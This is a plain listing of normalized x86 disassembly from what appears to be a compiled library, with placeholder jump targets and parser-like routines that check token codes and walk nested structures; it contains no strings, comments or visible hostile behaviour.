mov esi [ ebp + 0x8 ]
mov eax edi
call sub_10074140
add esp 0x4
pop esi
pop edi
mov eax 0x1
pop ebx
pop ebp
retn
push 0x2
jmp r-xdata
cmp ebx esi
jne r-xdata
xor eax eax
cmp [ edi + 0x18 ] esi
sete al
test eax eax
je r-xdata
xor ecx ecx
cmp eax 0x7
sete cl
mov eax ecx
test eax eax
je r-xdata
mov ebx [ ebp + 0x8 ]
call sub_10073f30
mov eax [ ebx + 0xc ]
mov [ eax ] 0x4
mov eax esi
pop esi
pop edi
pop ebx
pop ebp
retn
cmp ebx 0x2
jne r-xdata
xor eax eax
cmp [ edi + 0x18 ] esi
sete al
test eax eax
jne r-xdata
mov edi [ ebp + 0x8 ]
mov eax edi
call sub_10073b20
mov edx [ edi + 0xc ]
mov eax esi
pop esi
pop edi
mov [ edx ] 0x5
pop ebx
pop ebp
retn
push 0x5
mov edi [ ebp + 0x8 ]
mov eax edi
call sub_10073b20
mov edx [ edi + 0xc ]
mov [ edx ] 0x5
mov eax [ edi + 0xc ]
mov [ eax + 0x34 ] esi
mov eax esi
pop esi
pop edi
pop ebx
pop ebp
retn
push 0x96
push 0x42
push 0x0
push 0xa
push 0x0
mov eax edi
call sub_10073730
add esp 0x14
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
mov eax edi
call sub_10073670
add esp 0x4
pop esi
pop edi
xor eax eax
pop ebx
pop ebp
retn
sub_10075bb0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
mov eax [ esi ]
push edi
mov edi [ ebp + 0x8 ]
cmp eax 0x5
ja r-xdata
push esi
push edi
call sub_1006db40
add esp 0x8
pop edi
pop esi
pop ebp
retn
push ebx
jmp [ eax * 4 + jump_table_10075c98 ]
xor ebx ebx
cmp [ esi + 0x14 ] ebx
jbe r-xdata
xor ebx ebx
cmp [ esi + 0x50 ] ebx
jbe r-xdata
mov eax [ esi + 0x10 ]
push eax
mov edx [ esi + 0x10 ]
push edx
push edi
call sub_1006db40
mov eax [ esi + 0x20 ]
push eax
push edi
call sub_1006db40
mov ecx [ esi + 0x24 ]
push ecx
push edi
call sub_1006db40
mov edx [ esi + 0x28 ]
push edx
push edi
call sub_1006db40
add esp 0x20
pop ebx
push esi
push edi
call sub_1006db40
add esp 0x8
pop edi
pop esi
pop ebp
retn
mov eax [ esi + 0x10 ]
mov ecx [ eax + ebx * 4 ]
push ecx
push edi
call sub_10075bb0
inc ebx
add esp 0x8
cmp ebx [ esi + 0x14 ]
jb r-xdata
mov edx [ esi + 0x4c ]
push edx
push edi
call sub_1006db40
xor ebx ebx
add esp 0x8
cmp [ esi + 0x14 ] ebx
jbe r-xdata
lea esp [ esp ]
mov edx [ esi + 0x10 ]
push edx
jmp r-xdata
lea ebx [ ebx ]
mov eax [ esi + 0x4c ]
mov ecx [ eax + ebx * 4 ]
push ecx
push edi
call sub_10044040
inc ebx
add esp 0x8
cmp ebx [ esi + 0x50 ]
jb r-xdata
push edi
call sub_1006db40
add esp 0x8
pop ebx
mov eax [ esi + 0x10 ]
mov ecx [ eax + ebx * 4 ]
push ecx
push edi
call sub_10075bb0
inc ebx
add esp 0x8
cmp ebx [ esi + 0x14 ]
jb r-xdata
sub_10075cb0
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx [ ebp + 0xc ]
mov eax [ ebx ]
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ esi + 0xc ]
mov [ ebp - 0x4 ] edi
cmp eax 0x6
je r-xdata
push esi
mov eax ebx
call sub_10073670
mov eax [ esi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push esi
call sub_1001d270
add esp 0xc
cmp eax 0x4
jne r-xdata
cmp eax 0x5
jne r-xdata
push esi
call sub_100742c0
add esp 0x4
mov edi ebx
mov eax esi
call sub_100740e0
cmp eax 0x3
jne r-xdata
push esi
call sub_100742c0
mov edi ebx
mov eax esi
call sub_100740e0
push r--data
call sub_100386a0
mov edx [ esi + 0xc ]
add esp 0x8
pop edi
pop esi
mov [ edx + 0x3c ] 0x0
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
test eax eax
jne r-xdata
mov eax [ edi + 0xc ]
test eax eax
je r-xdata
cmp eax 0x1
jne r-xdata
push esi
mov eax ebx
call sub_10073670
mov edx [ esi + 0xc ]
mov eax [ edx + 0x68 ]
push eax
push esi
call sub_1001d270
add esp 0xc
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov esi ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
call sub_10073c00
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ edi + 0x8 ]
mov eax [ ecx + eax * 4 - 0x4 ]
push 0x96
push 0x2
push 0x6
push 0x7
push 0x82
push 0x5
push 0x4
push 0x7b
push 0x7e
push 0x8b
push 0x3
push 0x1
mov eax ebx
call sub_10073730
add esp 0x30
test eax eax
je r-xdata
xor eax eax
cmp [ ebx + 0x18 ] eax
sete al
test eax eax
je r-xdata
mov edx [ ebx ]
cmp edx 0x1
jne r-xdata
push ebx
push esi
call sub_10075980
add esp 0x8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push esi
mov eax ebx
call sub_10073670
mov ecx [ esi + 0x4 ]
mov eax [ ecx + 0x4 ]
push esi
mov edi ebx
call sub_10074d30
add esp 0x8
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
cmp edx 0x7
jne r-xdata
mov eax [ ebx + 0x18 ]
xor ecx ecx
cmp eax 0xa
sete cl
test ecx ecx
je r-xdata
push 0x96
push 0x0
push 0xa
push 0x0
mov eax ebx
call sub_10073730
add esp 0x10
test eax eax
je r-xdata
cmp [ edi + 0xc ] 0x0
mov [ ebp + 0x8 ] 0x0
jbe r-xdata
xor ecx ecx
cmp eax 0x81
sete cl
mov eax ecx
test eax eax
je r-xdata
push esi
mov eax ebx
call sub_10073670
add esp 0x4
cmp [ edi + 0xc ] 0x2
jb r-xdata
push 0x96
push 0x1e
push 0x79
push 0xc
push 0x19
push 0x1d
push 0xd
push 0x7a
push 0x15
push 0x16
push 0x17
push 0x23
push 0x24
push 0x6a
push 0x20
push 0x26
push 0x7f
push 0x78
push 0x8e
push 0x1c
push 0xe
push 0xb
push 0x18
push 0x1
mov eax ebx
call sub_10073730
add esp 0x60
test eax eax
je r-xdata
push esi
mov eax 0xa
call sub_100745c0
add esp 0x4
test eax eax
je r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov eax edi
mov edi [ eax + 0x8 ]
push esi
mov eax ebx
call sub_10073670
add esp 0x4
cmp [ edi + 0xc ] 0x2
jb r-xdata
mov eax [ esi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push esi
call sub_1001d270
add esp 0x8
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ edi + 0x8 ]
mov eax [ ecx + 0x4 ]
push 0xa
call sub_100737d0
add esp 0x4
test eax eax
je r-xdata
push 0x96
push 0x14
push 0x13
push 0x12
push 0x11
push 0x10
push 0xf
push 0x1
mov eax ebx
call sub_10073730
add esp 0x20
test eax eax
je r-xdata
push ebx
call sub_10074c20
mov edi ebx
add esp 0x4
mov ebx esi
mov [ ebp + 0x8 ] eax
call sub_10073f30
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ edi + 0xc ] 0x0
mov [ ebp + 0xc ] 0x1
mov [ ebp + 0x8 ] 0x0
jbe r-xdata
push esi
mov eax ebx
call sub_10073670
add esp 0x4
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
inc eax
add edi 0x4
mov [ ebp + 0x8 ] eax
cmp eax [ edx + 0xc ]
jb r-xdata
mov ecx [ esi + 0xc ]
mov edx [ ecx + 0x68 ]
push edx
push esi
call sub_1001d270
add esp 0x8
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov ebx edi
mov edx [ ebx + 0x8 ]
mov edi [ edx + 0x4 ]
push 0xa
mov eax edi
call sub_100737d0
add esp 0x4
test eax eax
je r-xdata
mov edx edi
mov [ edx + 0x3c ] 0x0
mov eax [ ecx + 0x4 ]
push esi
mov edi ebx
call sub_10074d30
add esp 0x4
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
push 0x96
push 0x84
push 0x1b
push 0x1
mov eax ebx
call sub_10073730
add esp 0x10
test eax eax
je r-xdata
push ebx
call sub_10074c20
add esp 0x4
push 0x96
push 0x14
push 0x13
push 0x12
push 0x11
mov [ ebp + 0x8 ] eax
push 0x10
push 0xf
mov eax esi
call sub_10073470
push eax
call sub_10073780
add esp 0x20
test eax eax
je r-xdata
mov edx [ esi + 0xc ]
mov [ edx ] 0x12
cmp [ ebx ] 0x2
jne r-xdata
mov edx edi
mov edi [ edx + 0x8 ]
mov edi edi
push 0x96
push 0x0
mov ecx [ edi ]
push 0xa
push 0x66
push 0x64
push 0x68
push 0x65
push 0x67
push 0x63
push 0x19
push 0x1f
push 0x21
push 0x22
push ecx
call sub_10073780
add esp 0x38
test eax eax
je r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x3c ] 0x0
je r-xdata
cmp [ ebx ] 0x1
jne r-xdata
push ebx
call sub_10074c20
mov edi ebx
add esp 0x4
mov ebx esi
mov [ ebp + 0x8 ] eax
call sub_10073f30
mov eax [ ebp - 0x4 ]
pop edi
pop esi
mov [ eax + 0x40 ] 0x1
mov [ eax + 0x3c ] 0x0
mov eax [ ebp + 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
mov edi ebx
mov ebx esi
call sub_10073f30
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push esi
mov eax ebx
call sub_10073670
add esp 0x4
mov eax esi
call sub_10073b20
mov ecx [ edi + 0x8 ]
mov ecx [ ecx + 0x4 ]
mov eax [ edi + 0x68 ]
add ecx 0x10
call sub_10073ae0
mov eax [ ebp + 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
cmp [ ebx + 0x18 ] eax
sete al
test eax eax
je r-xdata
push esi
mov eax ebx
call sub_10073670
mov edi [ ebp - 0x4 ]
add esp 0x4
mov [ ebp + 0xc ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
inc eax
add edi 0x4
mov [ ebp + 0x8 ] eax
cmp eax [ ecx + 0xc ]
jb r-xdata
lea esp [ esp ]
push 0x96
push 0x21
push 0x22
push 0x1
mov eax ebx
call sub_10073730
add esp 0x10
test eax eax
je r-xdata
mov eax [ ebx + 0x18 ]
xor ecx ecx
cmp eax 0x69
sete cl
test ecx ecx
je r-xdata
mov eax [ esi + 0xc ]
pop edi
pop esi
mov [ eax + 0x34 ] 0x1
mov eax [ ebp + 0xc ]
pop ebx
mov esp ebp
pop ebp
retn
push 0x96
push 0x0
push 0xa
push 0x66
push 0x64
push 0x68
mov eax [ edi ]
push 0x65
push 0x67
push 0x63
push 0x3d
push 0x3e
push 0x19
push 0x72
push 0x71
push 0x1f
push 0x21
push 0x22
push eax
call sub_10073780
add esp 0x48
test eax eax
je r-xdata
mov edi ecx
jmp r-xdata
mov eax esi
call sub_10073b20
mov ecx [ ebx + 0x8 ]
cmp eax [ ecx + 0x4 ]
jne r-xdata
mov ebx esi
call sub_100743d0
mov edx [ ebx + 0x4 ]
mov ecx [ edx + 0x4 ]
mov edx [ ecx + 0x14 ]
add ecx 0x10
xor eax eax
test edx edx
je r-xdata
cmp [ ebx ] 0x1
jne r-xdata
push 0x0
jmp r-xdata
xor edx edx
cmp eax 0x1f
sete dl
mov eax edx
test eax eax
je r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
push edi
push ebx
call sub_10075bb0
mov edi [ ebp + 0xc ]
add esp 0x8
call sub_10073f30
mov eax [ ebx + 0xc ]
pop edi
pop esi
mov [ eax ] 0x13
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ecx ]
lea ebx [ ebx ]
push 0x96
push 0x1e
push 0x79
push 0xc
push 0x1b
push 0x1d
push 0xd
push 0x7a
push 0x84
push 0x15
push 0x16
push 0x17
push 0x23
push 0x24
push 0x6a
push 0x20
push 0x26
push 0x7f
push 0x78
push 0x8e
push 0x6e
push 0x1c
push 0xe
push 0xb
push 0x18
push 0x0
mov eax ebx
call sub_10073730
add esp 0x68
test eax eax
je r-xdata
mov eax [ ebx + 0x18 ]
xor ecx ecx
cmp eax 0x88
sete cl
test ecx ecx
je r-xdata
push ebx
push esi
call sub_10074ca0
push ebx
call sub_10074c20
mov edi ebx
add esp 0x10
mov ebx esi
mov [ ebp + 0x8 ] eax
call sub_10073f30
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x1
push ebx
call sub_10074c20
mov edi ebx
add esp 0x4
mov ebx esi
mov [ ebp + 0x8 ] eax
call sub_10073f30
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
mov [ ecx + 0x30 ] eax
mov eax [ ebp + 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
push r--data
call sub_100386a0
push esi
mov eax ebx
call sub_10073670
mov edx [ esi + 0xc ]
mov eax [ edx + 0x68 ]
push eax
push esi
call sub_1001d270
add esp 0x10
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
push ecx
push eax
push ebx
call sub_100307a0
add esp 0xc
inc eax
add esi 0x4
cmp eax edx
jb r-xdata
cmp [ ebx ] 0x2
jne r-xdata
mov eax [ ebx + 0x18 ]
push esi
call sub_100745c0
add esp 0x4
test eax eax
je r-xdata
xor ecx ecx
cmp eax 0x6e
sete cl
mov eax ecx
test eax eax
je r-xdata
push ebx
call sub_10074c20
mov edi ebx
mov ebx esi
mov [ ebp + 0xc ] eax
call sub_10073f30
mov eax ebx
push 0x6
push eax
call sub_10006e70
mov eax [ ebp + 0xc ]
add esp 0xc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ esi ] edi
je r-xdata
jmp r-xdata
push 0x96
push 0x21
push 0x22
push 0x0
mov eax ebx
call sub_10073730
add esp 0x10
test eax eax
je r-xdata
mov eax [ ebx + 0x18 ]
xor ecx ecx
cmp eax 0x69
sete cl
test ecx ecx
je r-xdata
mov eax [ ebx + 0x18 ]
push ebx
mov ecx esi
call sub_10074ba0
add esp 0x4
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
push esi
mov eax 0x6e
call sub_100745c0
add esp 0x4
push esi
test eax eax
je r-xdata
push 0x96
push 0x14
push 0x13
push 0x12
push 0x11
push 0x10
push 0xf
push 0x0
mov eax ebx
call sub_10073730
add esp 0x20
test eax eax
je r-xdata
mov edi [ ebx + 0x18 ]
push esi
mov eax edi
call sub_100745c0
add esp 0x4
test eax eax
jne r-xdata
xor ecx ecx
cmp eax 0x19
sete cl
test ecx ecx
je r-xdata
mov eax [ edi + 0x30 ]
mov [ ebp - 0x10 ] 0x1
mov [ edi + 0x30 ] 0x0
test eax eax
je r-xdata
call sub_100742c0
mov edi ebx
add esp 0x4
mov ebx esi
call sub_10073f30
mov edx [ ebp - 0x4 ]
pop edi
pop esi
mov [ edx + 0x3c ] 0x0
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
call sub_10073670
push ebx
mov eax 0x6e
mov ecx esi
call sub_10074ba0
add esp 0x8
mov [ edi + 0x34 ] 0x1
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx ] 0x1
jne r-xdata
push 0x96
push 0x14
push 0x13
push 0x12
push 0x11
push 0x10
push 0xf
push esi
call sub_10074690
add esp 0x20
test eax eax
je r-xdata
push ebx
mov eax edi
mov ecx esi
call sub_10074ba0
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push esi
mov eax ebx
call sub_10073670
mov ecx [ esi + 0xc ]
mov edx [ ecx + 0x68 ]
push edx
push esi
call sub_1001d270
add esp 0xc
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
xor ecx ecx
cmp eax 0x1f
sete cl
mov eax ecx
test eax eax
je r-xdata
push esi
mov eax 0x19
call sub_10074780
add esp 0x4
test eax eax
jne r-xdata
push r--data
call sub_100386a0
push esi
mov eax ebx
call sub_10073670
mov edx [ esi + 0xc ]
mov eax [ edx + 0x68 ]
push eax
push esi
call sub_1001d270
add esp 0x10
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov ebx eax
mov eax esi
call sub_10074620
test eax eax
je r-xdata
push 0x96
push 0x3a
push 0x94
push 0x29
push 0x8a
push 0x2a
push 0x2b
push 0x38
push 0x8f
push 0x28
push 0x32
push 0x8c
push 0x39
push 0x1
mov eax ebx
call sub_10073730
add esp 0x38
test eax eax
je r-xdata
xor eax eax
cmp [ ebx + 0x18 ] 0x27
sete al
test eax eax
je r-xdata
mov edi 0x96
call sub_10074860
mov edx [ ebx + 0x18 ]
push edx
mov eax esi
call sub_10073470
call sub_100737d0
mov edi eax
add esp 0x4
test edi edi
jne r-xdata
push esi
mov eax 0x1f
call sub_10074720
add esp 0x4
test eax eax
je r-xdata
push ebx
mov eax 0x19
mov ecx esi
call sub_10074ba0
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push esi
mov eax ebx
call sub_10073670
push esi
call sub_100742c0
push 0x19
mov eax 0x10
mov ecx esi
call sub_10073f70
add esp 0xc
mov [ edi + 0x34 ] 0x1
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov ebx [ ebp + 0xc ]
mov edi 0x96
call sub_10074860
mov eax esi
call sub_10073470
cmp eax ebx
je r-xdata
mov edi [ ebx ]
cmp edi 0x1
jne r-xdata
push esi
call sub_100742c0
mov edi ebx
add esp 0x4
mov ebx esi
call sub_10073f30
mov ebx eax
mov edi esi
call sub_10074250
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp + 0xc ]
push eax
mov eax esi
mov [ ebp - 0x4 ] 0x1
call sub_100741a0
add esp 0x4
test eax eax
je r-xdata
mov eax esi
call sub_10073b20
push 0x96
push 0x14
push 0x13
push 0x12
push 0x11
push 0x10
push 0xf
push eax
call sub_10073780
add esp 0x20
test eax eax
je r-xdata
push esi
mov eax ebx
call sub_10073670
add esp 0x4
push ebx
mov eax 0x1f
mov ecx esi
call sub_10074ba0
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ ebp - 0x10 ]
mov eax [ ebp + 0xc ]
push esi
call sub_10073670
add esp 0x4
xor edi edi
jmp r-xdata
push 0x96
push 0x3a
push 0x94
push 0x29
push 0x8a
push 0x2a
push 0x2b
push 0x92
push 0x38
push 0x8f
push 0x28
push 0x32
push 0x8c
push 0x39
push 0x27
push 0x0
mov eax ebx
call sub_10073730
add esp 0x40
test eax eax
je r-xdata
xor eax eax
cmp [ ebx + 0x18 ] 0x92
sete al
test eax eax
je r-xdata
push esi
call sub_100742c0
mov edi ebx
add esp 0x4
mov ebx esi
call sub_10073f30
mov ebx eax
mov edi esi
call sub_10074250
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push esi
mov eax ebx
call sub_10073670
push 0x27
push ebx
push esi
call sub_100750d0
lea ecx [ ebp + 0xc ]
push ecx
mov eax esi
call sub_100741a0
add esp 0x14
test eax eax
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push edx
push eax
push esi
call sub_100307a0
add esp 0xc
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ edx ]
lea ecx [ ecx + eax * 4 ]
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0xc ]
add edx 0x8
dec eax
js r-xdata
push 0x96
push 0x4a
push 0x90
push 0x7c
push 0x1
mov eax ebx
call sub_10073730
add esp 0x14
test eax eax
je r-xdata
mov ecx [ ebx + 0x18 ]
push ecx
push ebx
push esi
call sub_100750d0
add esp 0xc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push esi
mov [ ebp + 0xc ] edi
call sub_100742c0
push esi
mov eax 0x92
call sub_100745c0
add esp 0x8
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0xc ]
lea edx [ edi + 0x14 ]
push edx
push eax
push esi
call sub_100307a0
add edi 0x8
push edi
push eax
push esi
call sub_1003e150
add esp 0x18
sub ecx 0x4
dec eax
jns r-xdata
push 0x96
push 0x4a
push 0x90
push 0x7c
push 0x0
mov eax ebx
call sub_10073730
add esp 0x14
test eax eax
je r-xdata
push esi
call sub_100742c0
mov edi ebx
mov ebx esi
call sub_10073f30
mov ebx r--data
mov edi esi
call sub_10074250
push edi
call sub_10073370
add esp 0x8
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov edi ebx
mov ebx esi
call sub_10073f30
mov edi ebx
mov eax edi
call sub_10073470
mov ebx eax
call sub_10074250
mov eax [ ebp + 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push esi
mov eax ebx
mov [ ebp + 0xc ] 0x0
call sub_10073670
push 0x92
push ebx
push esi
call sub_100750d0
push esi
call sub_100742c0
add esp 0x14
cmp [ ecx ] ebx
je r-xdata
cmp edi 0x1
jne r-xdata
mov edi [ ebx + 0x18 ]
push esi
mov eax edi
call sub_100747e0
add esp 0x4
test eax eax
je r-xdata
push 0x96
push 0x43
push 0x74
push 0x46
push 0x47
push 0x49
push 0x42
push 0x52
push 0x1
mov eax ebx
call sub_10073730
add esp 0x24
test eax eax
je r-xdata
xor eax eax
cmp [ ebx + 0x18 ] 0x5f
sete al
test eax eax
je r-xdata
push ebx
mov eax edi
mov ecx esi
call sub_10074ba0
add esp 0x4
mov ebx esi
call sub_100743d0
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
cmp edi 0x1
jne r-xdata
mov [ ebp - 0x4 ] 0x1
cmp edi 0x1
jne r-xdata
mov ecx [ esi + 0x4 ]
mov edx [ ecx ]
cmp [ edx + 0x2c ] edi
je r-xdata
push 0x96
push 0x4f
push 0x4e
push 0x4b
push 0x1
mov eax ebx
call sub_10073730
add esp 0x14
test eax eax
je r-xdata
xor eax eax
cmp [ ebx + 0x18 ] 0x6d
sete al
test eax eax
je r-xdata
push esi
call sub_100742c0
mov edi ebx
add esp 0x4
mov ebx esi
call sub_10073f30
mov esi eax
mov eax edi
cmp [ eax ] 0x1
jne r-xdata
xor eax eax
cmp [ ebx + 0x18 ] 0x46
sete al
test eax eax
je r-xdata
mov edi ebx
mov ebx esi
call sub_10073f30
push esi
call sub_10073370
mov eax [ esi + 0xc ]
add esp 0x4
pop edi
pop esi
mov [ eax ] 0x8
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
push ebx
call sub_10074c20
add esp 0x4
cmp edi 0x1
jne r-xdata
mov edi ebx
mov ebx esi
call sub_10073f30
mov eax esi
call sub_10073b20
mov ecx [ esi + 0xc ]
pop edi
mov eax 0x1
pop esi
mov [ ecx + 0x38 ] eax
pop ebx
mov esp ebp
pop ebp
retn
push r--data
lea ecx [ ebx + 0x1c ]
mov eax r--data
call sub_100732c0
add esp 0x4
test eax eax
jne r-xdata
mov edi ebx
mov ebx [ ebp - 0x4 ]
xor ecx ecx
cmp [ eax + 0x18 ] 0x46
sete cl
test ecx ecx
je r-xdata
push esi
mov eax ebx
mov [ ebp - 0x4 ] 0x0
call sub_10073670
add esp 0x4
mov [ ebx + 0x18 ] 0x47
push 0x96
push 0x71
push 0x72
push 0x1
mov eax ebx
call sub_10073730
add esp 0x10
test eax eax
je r-xdata
mov eax [ ebx + 0x18 ]
xor ecx ecx
cmp eax 0x1a
sete cl
test ecx ecx
je r-xdata
push esi
call sub_100742c0
mov edi ebx
add esp 0x4
mov ebx esi
call sub_10073f30
mov eax esi
call sub_10073b20
mov edx [ esi + 0xc ]
pop edi
mov eax 0x1
pop esi
mov [ edx + 0x38 ] eax
pop ebx
mov esp ebp
pop ebp
retn
push esi
call sub_10073370
add esp 0x4
mov edi [ ebp + 0x8 ]
push edi
xor ebx ebx
call sub_10073670
add esp 0x4
or [ esi + 0xc ] 0x40
mov [ esi + 0x1c ] 0x47
jmp r-xdata
push 0x96
push 0x3d
push 0x3e
push 0x1
mov eax ebx
call sub_10073730
add esp 0x10
test eax eax
je r-xdata
push 0x72
mov eax esi
call sub_10073470
call sub_100737d0
add esp 0x4
test eax eax
je r-xdata
xor ecx ecx
cmp eax 0x83
sete cl
test ecx ecx
je r-xdata
push ebx
call sub_10074c20
mov edi ebx
mov ebx esi
mov [ ebp + 0xc ] eax
call sub_10073f30
mov eax esi
call sub_10073b20
mov edx [ esi + 0xc ]
push esi
mov [ edx + 0x38 ] 0x1
call sub_10073370
mov eax [ ebp + 0xc ]
add esp 0x8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax edi
call sub_10073b20
mov ecx [ edi + 0xc ]
push edi
mov [ ecx + 0x38 ] 0x1
call sub_10073370
add esp 0x4
pop edi
pop esi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
cmp edi 0x2
jne r-xdata
push esi
mov eax 0x3c
mov [ ebp + 0x8 ] 0x1
call sub_100745c0
add esp 0x4
test eax eax
je r-xdata
push esi
call sub_100742c0
mov edi ebx
add esp 0x4
mov ebx esi
call sub_10073f30
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_10073b20
xor ecx ecx
cmp eax 0x73
sete cl
test ecx ecx
je r-xdata
push esi
mov eax ebx
call sub_10073670
mov eax [ esi + 0xc ]
add esp 0x4
cmp [ eax + 0x30 ] 0x0
je r-xdata
cmp edi 0x1
jne r-xdata
xor eax eax
cmp [ ebx + 0x18 ] 0x42
sete al
test eax eax
je r-xdata
push 0x3c
mov eax esi
call sub_10073470
call sub_100737d0
add esp 0x4
test eax eax
jne r-xdata
mov edi 0x96
call sub_10074860
xor ecx ecx
cmp eax 0x85
sete cl
test ecx ecx
je r-xdata
push 0x2
mov eax ebx
call sub_10074140
mov eax [ esi + 0xc ]
push esi
mov [ eax + 0x40 ] 0x1
call sub_10073370
add esp 0x8
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
push ebx
mov [ eax + 0x38 ] 0x1
call sub_10074c20
push esi
call sub_10073370
lea edi [ ebx + 0x1c ]
push r--data
push edi
mov [ ebp - 0x10 ] edi
call sub_10069d70
push r--data
push edi
mov [ ebp + 0x8 ] eax
call sub_10069d70
push r--data
push edi
mov [ ebp + 0xc ] eax
call sub_10069d70
mov [ ebp - 0xc ] eax
push 0x69
mov eax 0x20
mov ecx esi
call sub_10073f70
add esp 0x24
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ eax + 0x68 ]
push eax
push esi
call sub_1001d270
add esp 0x8
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
push 0x96
push 0x66
push 0x64
push 0x68
push 0x65
push 0x67
push 0x63
push 0x1
push 0x80
push 0x61
push 0x62
push 0x60
push 0x1
mov eax ebx
call sub_10073730
add esp 0x34
test eax eax
jne r-xdata
mov eax [ ebx + 0x18 ]
xor ecx ecx
cmp eax 0x53
sete cl
test ecx ecx
je r-xdata
push esi
mov eax ebx
call sub_10073670
push esi
call sub_100742c0
push 0x42
lea eax [ edi + 0xe ]
mov ecx esi
call sub_10073f70
add esp 0xc
mov eax esi
call sub_10073b20
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
push esi
mov eax ebx
call sub_10073670
add esp 0x4
jmp r-xdata
xor ecx ecx
cmp eax 0x48
sete cl
test ecx ecx
je r-xdata
push ebx
call sub_10074c20
push esi
mov edi eax
call sub_100742c0
push esi
call sub_10073370
push 0x4
mov eax ebx
call sub_10074140
add esp 0x10
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x1a
mov eax 0x20
mov ecx esi
call sub_10073f70
mov eax esi
call sub_10073b20
push 0x6c
mov eax 0x20
mov ecx esi
call sub_10073f70
mov edi [ esi + 0xc ]
mov edx [ ebx + 0x10 ]
add edi 0x48
mov [ edi + 0xc ] edx
mov eax [ ebx + 0x4 ]
mov [ edi + 0x10 ] eax
mov ecx [ ebx + 0x8 ]
mov [ edi + 0x14 ] ecx
mov edx [ ebx + 0xc ]
add esp 0x8
cmp [ ebp + 0x8 ] 0x0
mov [ edi + 0x18 ] edx
mov [ edi + 0x1c ] 0x2
je r-xdata
mov ecx [ ebp + 0xc ]
add eax 0x4c
push eax
push ecx
push esi
call sub_10006860
add esp 0xc
cmp edi 0x1
je r-xdata
xor ecx ecx
cmp eax 0x5c
sete cl
mov eax ecx
test eax eax
je r-xdata
push esi
call sub_100742c0
mov eax ebx
mov edi esi
call sub_10074e60
push esi
mov eax ebx
call sub_10074da0
push esi
mov eax 0x2
call sub_10073fd0
add esp 0xc
mov [ ebp + 0x8 ] 0x0
xor ecx ecx
cmp eax 0x87
sete cl
test ecx ecx
je r-xdata
push esi
call sub_10073370
push 0x4
mov eax ebx
call sub_10074140
add esp 0x8
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
